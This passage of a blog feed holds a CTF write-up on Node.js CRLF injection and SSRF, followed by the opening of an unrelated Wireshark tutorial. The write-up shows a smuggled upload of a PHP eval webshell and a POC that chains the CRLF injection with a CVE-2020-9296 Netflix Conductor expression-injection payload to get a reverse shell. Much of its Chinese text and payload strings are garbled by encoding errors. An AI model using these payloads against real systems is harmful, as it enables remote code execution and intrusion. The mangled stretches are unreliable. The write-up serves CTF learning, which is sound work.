Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº</span></span><br></pre></td></tr></table></figure><p>æ„é€ è¯·æ±‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿”å›åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"><span class="built_in">test</span>: HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>åœ¨SSRFä¸­æˆ‘ä»¬ç»å¸¸ä½¿ç”¨ Gopher åè®®å»æ”»å‡»å†…ç½‘åº”ç”¨ï¼Œæ¯”å¦‚Redisã€MySQLã€FTPç­‰ã€‚ä½†æ˜¯å½“ Gopher åè®®è¢«è¿‡æ»¤äº†ä¹‹åï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡HTTPåè®®å¹¶é…åˆCRLFæ¼æ´è¿›è¡Œæ”»å‡»ï¼Œè¾¾åˆ°ä¸ Gopher åè®®ä¸€æ ·çš„æ•ˆæœã€‚</p><p>è‡³æ­¤ï¼Œå®Œæˆäº† nodejs CRLF æ³¨å…¥å¤ç°</p><h3 id="å†æ¬¡å›åˆ°é¢˜ç›®ä¸­"><a href="#å†æ¬¡å›åˆ°é¢˜ç›®ä¸­" class="headerlink" title="å†æ¬¡å›åˆ°é¢˜ç›®ä¸­"></a>å†æ¬¡å›åˆ°é¢˜ç›®ä¸­</h3><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡ é¢˜ç›®çš„ <code>GET</code> ä»£ç†å‘é€ <code>POST</code>è¯·æ±‚ï¼ˆå‡å¦‚é¢˜ç›®ä¸­çš„ node ç‰ˆæœ¬æ˜¯ &lt; 9ï¼‰ï¼Œç°åœ¨å°è¯•åˆ©ç”¨æ¼æ´ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½åˆ©ç”¨æˆåŠŸã€‚</p><p>æ„é€  POCï¼Œnode æˆ– F12 æ§åˆ¶è¿è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// netflix çš„å†…ç½‘ IP åœ°å€</span><br><span class="line">netflix_host = <span class="string">&quot;10.0.49.14&quot;</span></span><br><span class="line">// åœ¨å¤ç° CVE-<span class="number">2020</span>-<span class="number">9296</span> æ—¶ç”Ÿæˆçš„ BCEL ç¼–ç </span><br><span class="line">bcel_evil = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">// ä»¥ä¸‹ä¸ç”¨æ”¹</span><br><span class="line">post_payload = <span class="string">&#x27;[\u&#123;017b&#125;\u&#123;0122&#125;name\u&#123;0122&#125;:\u&#123;0122&#125;$\u&#123;017b&#125;\u&#123;0127&#125;1\u&#123;0127&#125;.getClass().forName(\u&#123;0127&#125;com.sun.org.apache.bcel.internal.util.ClassLoader\u&#123;0127&#125;).newInstance().loadClass(\u&#123;0127&#125;&#x27;</span> +  bcel_evil + <span class="string">&#x27;\u&#123;0127&#125;).newInstance().class\u&#123;017d&#125;\u&#123;0122&#125;,\u&#123;0122&#125;ownerEmail\u&#123;0122&#125;:\u&#123;0122&#125;test@example.org\u&#123;0122&#125;,\u&#123;0122&#125;retryCount\u&#123;0122&#125;:\u&#123;0122&#125;3\u&#123;0122&#125;,\u&#123;0122&#125;timeoutSeconds\u&#123;0122&#125;:\u&#123;0122&#125;1200\u&#123;0122&#125;,\u&#123;0122&#125;inputKeys\u&#123;0122&#125;:[\u&#123;0122&#125;sourceRequestId\u&#123;0122&#125;,\u&#123;0122&#125;qcElementType\u&#123;0122&#125;],\u&#123;0122&#125;outputKeys\u&#123;0122&#125;:[\u&#123;0122&#125;state\u&#123;0122&#125;,\u&#123;0122&#125;skipped\u&#123;0122&#125;,\u&#123;0122&#125;result\u&#123;0122&#125;],\u&#123;0122&#125;timeoutPolicy\u&#123;0122&#125;:\u&#123;0122&#125;TIME_OUT_WF\u&#123;0122&#125;,\u&#123;0122&#125;retryLogic\u&#123;0122&#125;:\u&#123;0122&#125;FIXED\u&#123;0122&#125;,\u&#123;0122&#125;retryDelaySeconds\u&#123;0122&#125;:\u&#123;0122&#125;600\u&#123;0122&#125;,\u&#123;0122&#125;responseTimeoutSeconds\u&#123;0122&#125;:\u&#123;0122&#125;3600\u&#123;0122&#125;,\u&#123;0122&#125;concurrentExecLimit\u&#123;0122&#125;:\u&#123;0122&#125;100\u&#123;0122&#125;,\u&#123;0122&#125;rateLimitFrequencyInSeconds\u&#123;0122&#125;:\u&#123;0122&#125;60\u&#123;0122&#125;,\u&#123;0122&#125;rateLimitPerFrequency\u&#123;0122&#125;:\u&#123;0122&#125;50\u&#123;0122&#125;,\u&#123;0122&#125;isolationgroupId\u&#123;0122&#125;:\u&#123;0122&#125;myIsolationGroupId\u&#123;0122&#125;\u&#123;017d&#125;]&#x27;</span></span><br><span class="line"></span><br><span class="line">encode_post_payload = encodeURI(<span class="string">&#x27;http://0.0.0.0:3000/\u&#123;0120&#125;HTTP/1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;POST\u&#123;0120&#125;/search?url=http://&#x27;</span> + netflix_host + <span class="string">&#x27;:8080/api/metadata/taskdefs\u&#123;0120&#125;HTTP/1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;Content-Type:application/json\u&#123;010D&#125;\u&#123;010A&#125;Content-Length:&#x27;</span> + post_payload.length + <span class="string">&#x27;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;&#x27;</span> + post_payload+ <span class="string">&#x27;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;GET\u&#123;0120&#125;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;GET /proxy?url=&quot;</span> + encode_post_payload + <span class="string">&quot; HTTP/1.1&quot;</span></span><br><span class="line"></span><br><span class="line">console.log(poc)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ encodeURI ç¼–ç  1 æ¬¡æ˜¯é˜²æ­¢ä¼ è¾“è¿‡ç¨‹ä¸­ç‰¹æ®Šå­—ç¬¦è¢«å¹²æ‰ ã€‚</p><p><code>console.log(poc)</code> è¾“å‡ºçš„ä¸œè¥¿æ›¿æ¢ HTTP åŒ…ç¬¬ä¸€è¡Œå³å¯ã€‚</p><p><img src="/img/2021hfctf/image-20210424120721588.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210424120721588.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424120721588"></p><p>æˆåŠŸåå¼¹</p><p><img src="/img/2021hfctf/image-20210424000231228.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210424000231228.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424000231228"></p><p>è¿™ä¸ªé¢˜ç›®æµç¨‹æœ‰ç‚¹å¤šï¼Œåšä¸ªå°æ€»ç»“</p><ul><li>nodejs æ•°ç»„ç»•è¿‡ç®¡ç†å‘˜ç™»å½•</li><li> <code>isPublic</code> ç»•è¿‡ï¼Œé€šè¿‡ /proxy è·å– /flag å¾—åˆ°æç¤º</li><li>é€šè¿‡ docker é»˜è®¤ç½‘æ®µï¼Œæˆ–è€…é¢˜ç›®ç»™çš„æç¤º fuzz å†…ç½‘ç½‘æ®µçš„8080ç«¯å£</li><li>æ„é€  CVE-2020-9296 Netflix  Post POC åå¼¹ shell </li><li>åˆ©ç”¨ nodejs &lt; 9 è¿›è¡Œ CRLFæ³¨å…¥ï¼Œå‘é€ CVE-2020-9296 Netflix  Post POC </li><li>æœ€ç»ˆé€šè¿‡ cat /flag è·å– flag</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> æ¯”èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wiresharkå…¥é—¨ä¸å®æˆ˜</title>
      <link href="2021/04/01/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/"/>
      <url>2021/04/01/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>wiresharkå…¥é—¨: <a href="https://www.bilibili.com/video/BV1X5411x7R4">https://www.bilibili.com/video/BV1X5411x7R4</a><br>ä»–è¿™é‡Œé¡ºåºæœ‰ç‚¹è¯¯ï¼Œåº”è¯¥æ˜¯ P1-P26ï¼ŒP32-P39ï¼ŒP27-P31<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656841-61d27bdc-5155-4965-b349-3cf88782698c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656841-61d27bdc-5155-4965-b349-3cf88782698c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h1 id="Wireshark-å…¥é—¨"><a href="#Wireshark-å…¥é—¨" class="headerlink" title="Wireshark å…¥é—¨"></a>Wireshark å…¥é—¨</h1><h2 id="ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤-WiresharkåŒ…è¿‡æ»¤"><a href="#ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤-WiresharkåŒ…è¿‡æ»¤" class="headerlink" title="ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤ - WiresharkåŒ…è¿‡æ»¤"></a>ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤ - WiresharkåŒ…è¿‡æ»¤</h2><p>BPFï¼ˆBerkeley Packet Filterï¼‰ é‡‡ç”¨ä¸è‡ªç„¶è¯­è¨€ç›¸è¿‘çš„è¯­æ³•ï¼Œåˆ©ç”¨è¯­æ³•æ„é€ å­—ç¬¦ä¸²ç¡®å®šä¿ç•™å…·ä½“ç¬¦åˆè§„åˆ™çš„æ•°æ®åŒ…è€Œå¿½ç•¥å…¶ä»–æ•°æ®åŒ…</p><p>æœ€ç®€å•è¯­æ³•ç©ºç™½å­—ç¬¦ï¼Œä»»ä½•æ•°æ®åŒ…éƒ½ç¬¦åˆç©ºç™½å­—ç¬¦è§„åˆ™</p><h3 id="è¯­æ³•è§„åˆ™"><a href="#è¯­æ³•è§„åˆ™" class="headerlink" title="è¯­æ³•è§„åˆ™"></a>è¯­æ³•è§„åˆ™</h3><ul><li>typeè¡¨ç¤ºå¯¹è±¡ å¦‚ IPåœ°å€ã€å­ç½‘æˆ–ç«¯å£ -&gt; hostã€netã€port</li><li>dir è¡¨ç¤ºæ•°æ®åŒ…ä¼ è¾“çš„æ–¹å‘ -&gt; srcã€dst</li><li>proto è¡¨ç¤ºä¸æ•°æ®åŒ…åŒ¹é…çš„åè®®ç±»å‹ -&gt; etherã€ipã€tcpã€arp</li></ul><h3 id="æ¼”ç¤ºå®ä¾‹"><a href="#æ¼”ç¤ºå®ä¾‹" class="headerlink" title="æ¼”ç¤ºå®ä¾‹"></a>æ¼”ç¤ºå®ä¾‹</h3><p><img 